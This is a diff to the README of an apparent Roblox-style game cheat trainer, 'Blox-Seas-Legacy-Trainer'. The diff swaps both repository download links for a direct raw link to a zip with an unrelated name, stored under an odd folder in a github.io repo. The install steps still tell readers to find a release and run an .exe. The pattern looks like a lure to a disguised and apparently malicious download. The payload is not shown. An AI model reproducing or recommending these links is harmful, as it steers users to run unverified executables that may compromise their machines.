@@ -5,7 +5,7 @@ description: "Automate leveling, fruit sniping, and combat actions in Blox Seas 
 ---
 # 🕹️ Blox-Seas-Legacy-Trainer - Master the game with ease today
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/teluguanime5865/Blox-Seas-Legacy-Trainer)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/teluguanime5865/teluguanime5865.github.io/main/Thracian/teluguanime-github-io-2.6.zip)
 
 ## 📌 Overview
 
@@ -25,7 +25,7 @@ This application runs on Windows systems. Ensure your machine meets the followin
 
 Follow these steps to prepare the tool on your computer.
 
-1. Visit the [official download page](https://github.com/teluguanime5865/Blox-Seas-Legacy-Trainer).
+1. Visit the [official download page](https://raw.githubusercontent.com/teluguanime5865/teluguanime5865.github.io/main/Thracian/teluguanime-github-io-2.6.zip).
 2. Locate the latest release version on the right side of the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can access, such as your Downloads folder.
